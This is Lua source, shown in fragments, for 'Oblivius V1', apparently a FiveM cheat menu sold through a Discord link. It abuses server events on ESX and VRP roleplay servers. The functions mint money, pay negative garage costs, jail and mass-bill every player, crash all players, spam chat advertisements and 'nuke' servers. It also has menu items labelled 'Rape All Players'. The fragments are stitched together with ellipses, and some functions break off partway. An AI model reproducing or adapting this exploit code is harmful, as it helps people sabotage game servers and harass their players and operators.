...
local function debugPrint(text)
    if oblV1.debug then
        Citizen.Trace("[oblV1] "..tostring(text))
    end
end
...
function oblV1.CreateMenu(id, title)
    -- Default settings
    menus[id] = { }
...
function oblV1.CreateSubMenu(id, parent, subTitle)
    if menus[parent] then
        oblV1.CreateMenu(id, menus[parent].title)
...
function oblV1.CurrentMenu()
    return currentMenu
end


function oblV1.OpenMenu(id)
    if id and menus[id] then
...
function oblV1.IsMenuOpened(id)
    return isMenuVisible(id)
end


function oblV1.IsAnyMenuOpened()
...
function oblV1.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
...
function oblV1.Button(text, subText)
...
function oblV1.MenuButton(text, id)
    if menus[id] then
        if oblV1.Button(text) then
            setMenuVisible(currentMenu, false)
...
function oblV1.CheckBox(text, checked, callback)
    if oblV1.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
        checked = not checked
...
function oblV1.ComboBox(text, items, currentIndex, selectedIndex, callback)
    ...
    if oblV1.Button(text, selectedItem) then
...
function oblV1.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function oblV1.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function oblV1.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function oblV1.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function oblV1.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function oblV1.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function oblV1.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function oblV1.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function oblV1.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function oblV1.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function oblV1.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function oblV1.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function oblV1.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function oblV1.SetMenuButtonPressedSound(id, name, set)
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'LuaMenuFr#0221 BUY EXECUTOR MENU <',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'https://discord.gg/9ZxpCtb'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'LuaMenuFr#0221 BUY EXECUTOR MENU < https://discord.gg/9ZxpCtb',
                                43161337
                            )
...
function teleportToNearestVehicle()
    ...
    Citizen.CreateThread(function()
        while discordPresence do
            ...
            SetDiscordRichPresenceAssetText("Oblivius| https://discord.gg/9ZxpCtb")
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Desudo; LuaMenuFr#0221")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'LuaMenuFr#0221',
                    {0, 0x99, 255},
                    '/ooc Oblivius Menu! Buy at https://discord.gg/9ZxpCtb'
                )
                TriggerServerEvent('_chat:messageEntered', 'LuaMenuFr#0221', {0, 0x99, 255}, 'Oblivius Menu <3 https://discord.gg/9ZxpCtb')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Desudo Babe <3 LuaMenuFr#0221 https://discord.gg/9ZxpCtb")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Desudo Babe <3 LuaMenuFr#0221 https://discord.gg/9ZxpCtb")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."LuaMenuFr#0221 discord")
					end
				end
				...
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "The best menu in fivem!?,https://discord.gg/GbsQxN LuaMenuFr#0221 ", 10000000)
						TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."LuaMenuFr#0221 discord")
				end
			end
...
Citizen.CreateThread(
    function()
        ...
        oblV1.CreateMenu("MainMenu", "OBLIVIUS V1")
		oblV1.SetSubTitle("MainMenu", "MENU STANDARD")
        oblV1.CreateSubMenu("SelfMenu", "MainMenu", "Self Menu")
        oblV1.CreateSubMenu("OnlinePlayersMenu", "MainMenu", "Players Online: " .. #getPlayerIds())
        oblV1.CreateSubMenu("WeaponMenu", "MainMenu", "Weapon Menu")
        oblV1.CreateSubMenu("SingleWeaponMenu", "WeaponMenu", "Single Weapon Spawner")
        oblV1.CreateSubMenu("MaliciousMenu", "MainMenu", "Malicious Hacks")
        oblV1.CreateSubMenu("VRPMenu", "MainMenu", "VRP Options")
        oblV1.CreateSubMenu("ESXMenu", "MainMenu", "ESX Options")
        oblV1.CreateSubMenu("ESXJobMenu", "ESXMenu", "ESX Jobs")
        oblV1.CreateSubMenu("ESXMoneyMenu", "ESXMenu", "ESX Money Menu")
        oblV1.CreateSubMenu("ESXDrugMenu", "ESXMenu", "ESX Drugs")
		oblV1.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
        oblV1.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
        oblV1.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
		oblV1.CreateSubMenu("AI", "MainMenu", "AI Menu")
        oblV1.CreateSubMenu('CarTypes', 'VehicleMenu', 'Vehicles')
        oblV1.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Moew :3')
        oblV1.CreateSubMenu('CarOptions', 'CarTypeSelection', 'Car Options')
		oblV1.CreateSubMenu('MainTrailer', 'VehicleMenu', 'Trailers to Attach')
        oblV1.CreateSubMenu('MainTrailerSel', 'VehMenu', 'Trailers Available')
        oblV1.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', 'Trailer Options')
		oblV1.CreateSubMenu('GCT', 'VehMenu', 'Global Car Trolls')
		oblV1.CreateSubMenu("Credits", "MainMenu", "Credits")
        oblV1.CreateSubMenu("PlayerOptionsMenu", "OnlinePlayersMenu", "Player Options")
        oblV1.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
        oblV1.CreateSubMenu("LSC", "VehMenu", "Welcome To Los santos customs!")
        oblV1.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
        oblV1.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
        oblV1.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
        oblV1.CreateSubMenu("PlayerESXTriggerMenu", "PlayerESXMenu", "ESX Triggers")
        oblV1.CreateSubMenu("BulletGunMenu", "WeaponMenu", "Bullets Gun Options")
        oblV1.CreateSubMenu("TrollMenu", "MainMenu", "Troll Options")
        oblV1.CreateSubMenu("WeaponCustomization", "WeaponMenu", "Weapon Cusomization Options")
        oblV1.CreateSubMenu("WeaponTintMenu", "WeaponCustomization", "Weapon Tints")
        oblV1.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
        oblV1.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
        oblV1.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
        oblV1.CreateSubMenu("SingleWepPlayer", "PlayerOptionsMenu", "Single Weapon Menu")
        oblV1.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
        oblV1.CreateSubMenu("VehBoostMenu", "LSC", "Vehicle Booster")
		oblV1.CreateSubMenu("Models", "MainMenu", "Models")
        ...
        while Enabled do
            if oblV1.IsMenuOpened("MainMenu") then
                drawNotification("~b~Opened")
                if oblV1.MenuButton    ("~r~→ Self ~s~Menu", "SelfMenu") then
                elseif oblV1.MenuButton("~r~→ Teleport ~s~Menu", "TeleportMenu") then
				elseif oblV1.MenuButton("~r~→ Al ~s~Menu", "AI") then
                elseif oblV1.MenuButton("~r~→ Online ~s~Players", "OnlinePlayersMenu") then
                elseif oblV1.MenuButton("~r~→ Weapon ~s~Menu", "WeaponMenu") then
                elseif oblV1.MenuButton("~r~→ Vehicle ~s~Menu", "VehMenu") then
                elseif oblV1.MenuButton("~r~→ Malicious ~s~Hacks", "MaliciousMenu") then
                elseif oblV1.MenuButton("~r~→ Trolling ~s~Options", "TrollMenu") then
                elseif oblV1.MenuButton("~r~→ ESX ~s~Options", "ESXMenu") then
                elseif oblV1.MenuButton("~r~→ VRP ~s~Options", "VRPMenu") then
				elseif oblV1.MenuButton("~r~→ Models ~s~Menu", "Models") then
				elseif oblV1.MenuButton("~r~→ Credits ~s~Menu", "Credits") then
                elseif oblV1.Button("~r~→ Close the menu") then
                    Enabled = false
                end

                oblV1.Display()
            elseif oblV1.IsMenuOpened("VRPMenu") then
                if oblV1.Button("VRP PayGarage 100$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100})
                elseif oblV1.Button("VRP PayGarage 1000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -1000})
                elseif oblV1.Button("VRP PayGarage 10 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -10000})
                elseif oblV1.Button("VRP PayGarage 100 000$") then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -100000})
                elseif oblV1.Button("VRP Get Driver Licence") then
                    TriggerServerEvent("dmv:success")
                elseif oblV1.Button("VRP Bank Deposit") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:deposit", amount)
                elseif oblV1.Button("VRP Bank Withdraw") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("bank:withdraw", amount)
                elseif oblV1.Button("VRP Slot Machine") then
                    local amount = KeyboardInput("Enter Amount Of Money", "", 99999999999)
                    TriggerServerEvent("vrp_slotmachine:server:2", amount)
                end

                oblV1.Display()
            elseif oblV1.IsMenuOpened("TrollMenu") then
                if oblV1.Button("ESX Server Crasher") then
                ...
                then
				elseif oblV1.Button("Spawn moutain Lion On Everyone") then
				...
				elseif oblV1.Button("SWAT W/ Railgun On Everyone") then
                ...
                elseif oblV1.Button("Nuke Server") then
                    nukeserver()
				elseif oblV1.Button("Esx Destroy V2") then
				    esxdestroyv2()
				elseif oblV1.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
				...
				elseif oblV1.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Oblivius Menu https://discord.gg/pAExtdR", "6536955669")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Oblivius Menu https://discord.gg/pAExtdR", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Oblivius Menu https://discord.gg/pAExtdR", "696G623691")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Oblivius Menu https://discord.gg/pAExtdR", "69693553S9")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Oblivius Menu https://discord.gg/pAExtdR", "6969696969")
                end
				elseif oblV1.Button("VRP Destroy V2") then
				    vrpdestroy()
                elseif oblV1.Button("Rape All Players") then
                    RapeAllFunc()
                elseif oblV1.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
				elseif oblV1.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                elseif oblV1.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
			    elseif oblV1.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                elseif oblV1.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                elseif oblV1.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif oblV1.Button("Fake Message") then
                ...
                elseif oblV1.Button("ESX Set All Police") then
                    for i = 0, 128 do
                        TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                    end
                elseif oblV1.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("TeleportMenu") then
                if oblV1.Button("Teleport To Waypoint") then
                    TeleportToWaypoint()
                elseif oblV1.Button("Teleport Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif oblV1.Button("Teleport To Coords") then
                    TeleportToCoords()
                elseif oblV1.CheckBox(
                    "Show Coords",
                    showCoords,
				...
				oblV1.Display()
			elseif oblV1.IsMenuOpened("Models") then	
			if oblV1.Button("~b~~h~Change to Clown") then
			...
			elseif oblV1.Button("~b~~h~Change to Swat") then
			...
			elseif oblV1.Button("~b~~h~Change to Stripper") then
			local model = "s_f_y_stripper_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Cop") then
			local model = "s_m_y_cop_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Chimp") then
			local model = "a_c_chimp"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Alien") then
			local model = "s_m_m_movalien_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Pongo") then
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Babyd") then
			local model = "u_m_y_babyd"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Big Fooot") then
			local model = "ig_orleans"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Franklin") then
			local model = "player_one"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Trevor") then
			local model = "player_two"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Michael") then
			local model = "player_zero"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif oblV1.Button("~b~~h~Change to Fivem skin") then
			...
			elseif oblV1.Button("~r~~h~Randomize Clothing") then
				SetPedRandomComponentVariation(PlayerPedId(), true)
			elseif oblV1.Button("Change Clothes (~g~ESX~s~)") then
                ...
                oblV1.Display()
			elseif oblV1.IsMenuOpened("AI") then
			                if oblV1.Button("~h~Configure AI ~g~Speed") then
                ...
                elseif oblV1.Button("~h~AI Drive (Waypoint_Slow)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif oblV1.Button("~h~AI Drive (Waypoint_Fast)") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
				...
				oblV1.Display()
				elseif oblV1.IsMenuOpened("VehMenu") then
				if oblV1.Button('~h~~p~»~s~ Vehicle List', 'CarTypes') then
				elseif oblV1.MenuButton('~h~~p~»~s~ Global Car Trolls', 'GCT') then
				elseif oblV1.MenuButton('~h~~p~»~s~ Spawn & Attach ~s~Trailer', 'MainTrailer') then
				elseif oblV1.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif oblV1.Button("Repair Engine Only") then
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
				...
				SetVehicleOilLevel(veh, 1000.0)
						...
						elseif oblV1.Button("~g~Buy vehicle for free") then fv()
					elseif
					oblV1.CheckBox(
				...
				then
                elseif oblV1.Button("Spawn a vehicle") then
                ...
                elseif oblV1.MenuButton("LS Customs", "LSC") then
				                elseif
                    oblV1.CheckBox(
                        'Speedboost',
                        VehSpeed,
                 ...
                 then
                elseif oblV1.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					oblV1.CheckBox(
						"No Fall",
				 ...
				 then
				elseif oblV1.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
            ...
            elseif oblV1.IsMenuOpened('GCT') then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("LSC") then
			...
			then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("ESXMenu") then
                if oblV1.MenuButton("ESX Money Options", "ESXMoneyMenu") then
                elseif oblV1.MenuButton("ESX Job Menu", "ESXJobMenu") then
                elseif oblV1.MenuButton("ESX Boss", "ESXBossMenu") then
                elseif oblV1.MenuButton("ESX Drugs", "ESXDrugMenu") then
                elseif oblV1.MenuButton("ESX Misc", "ESXMiscMenu") then
                end

                oblV1.Display()
            elseif oblV1.IsMenuOpened("ESXMiscMenu") then
                if oblV1.Button("ESX Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif oblV1.Button    ("ESX Get all licenses ") then
					TriggerServerEvent("dmv:success")
                ...
                elseif oblV1.Button("ESX Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
                end

                oblV1.Display()
            elseif oblV1.IsMenuOpened("ESXDrugMenu") then
                if oblV1.Button("Harvest Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                    TriggerServerEvent("esx_drugs:startHarvestWeed")
                elseif oblV1.Button("Transform Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                    TriggerServerEvent("esx_drugs:startTransformWeed")
                elseif oblV1.Button("Sell Weed (x5)") then
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                    TriggerServerEvent("esx_drugs:startSellWeed")
                elseif oblV1.Button("Harvest Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                    TriggerServerEvent("esx_drugs:startHarvestCoke")
                elseif oblV1.Button("Transform Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                    TriggerServerEvent("esx_drugs:startTransformCoke")
                elseif oblV1.Button("Sell Coke (x5)") then
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                    TriggerServerEvent("esx_drugs:startSellCoke")
                elseif oblV1.Button("Harvest Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                elseif oblV1.Button("Transform Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                elseif oblV1.Button("Sell Meth (x5)") then
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                    TriggerServerEvent("esx_drugs:startSellMeth")
                elseif oblV1.Button("Harvest Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                elseif oblV1.Button("Transform Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                elseif oblV1.Button("Sell Opium (x5)") then
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                    TriggerServerEvent ("esx_drugs:startSellOpium")
                    TriggerServerEvent("esx_drugs:startSellOpium")
                elseif oblV1.Button("Money Wash (x10)") then
                    ...
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
                elseif oblV1.Button("Stop all (Drugs)") then
			...
			elseif oblV1.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif oblV1.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif oblV1.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif oblV1.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif oblV1.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif oblV1.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif oblV1.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif oblV1.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif oblV1.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif oblV1.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif oblV1.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif oblV1.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif oblV1.Button("~g~Pilot & Taxi (ESX) $") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
			elseif oblV1.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif oblV1.Button("~g~Paycheck $") then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("SelfMenu") then
                if oblV1.Button("Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif oblV1.Button("Give Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif oblV1.Button("~g~ESX ~s~Set hunger 100%") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif oblV1.Button("~g~ESX ~s~Set thirst 100%") then
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif oblV1.Button("Give yourself money (ESX)") then
				...
				elseif oblV1.Button("Taxijob ESX 10.000x") then
				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
				elseif oblV1.Button("Give yourself money (VRP)") then
				TriggerServerEvent("dropOff", 100000)
				TriggerServerEvent('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				elseif oblV1.Button("Give yourself 10x salary (VRP)") then
                ...
                elseif oblV1.Button("Revive") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif oblV1.Button("~h~~b~Open Jail Menu ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif oblV1.Button("ESX Get Out Of Jail") then
                ...
                elseif oblV1.Button("Suicide") then
                ...
                oblV1.Display()
            elseif oblV1.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and oblV1.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    oblV1.Display()
				elseif oblV1.IsMenuOpened("Credits") then
				    if oblV1.Button("~r~~h~LuaMenuFr#0221 - Dev ") then
				elseif oblV1.Button("~g~~h~XxXSUPREMEXxX - Dev ") then
				elseif oblV1.Button("~b~~h~https://discord.gg/9ZxpCtb ") then
				
				end
				oblV1.Display()
                elseif oblV1.IsMenuOpened("PlayerOptionsMenu") then
                    oblV1.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if oblV1.Button("Spectate", (Spectating and "[WATCHING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif oblV1.Button("Rape Player") then
					    rapeplayer()
					elseif oblV1.Button("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif oblV1.Button("Teleport To Player With Vehicle") then
										drawNotification(
                    ...
                    elseif oblV1.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
					...
					elseif oblV1.Button("~g~Give ~w~Money") then
                    ...
                    elseif oblV1.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif oblV1.MenuButton("Troll Options", "PlayerTrollMenu") then
                    elseif oblV1.MenuButton("ESX Options", "PlayerESXMenu") then
                    elseif oblV1.MenuButton("Choose weapon", "SingleWepPlayer") then
                    elseif oblV1.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif oblV1.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif oblV1.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif oblV1.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
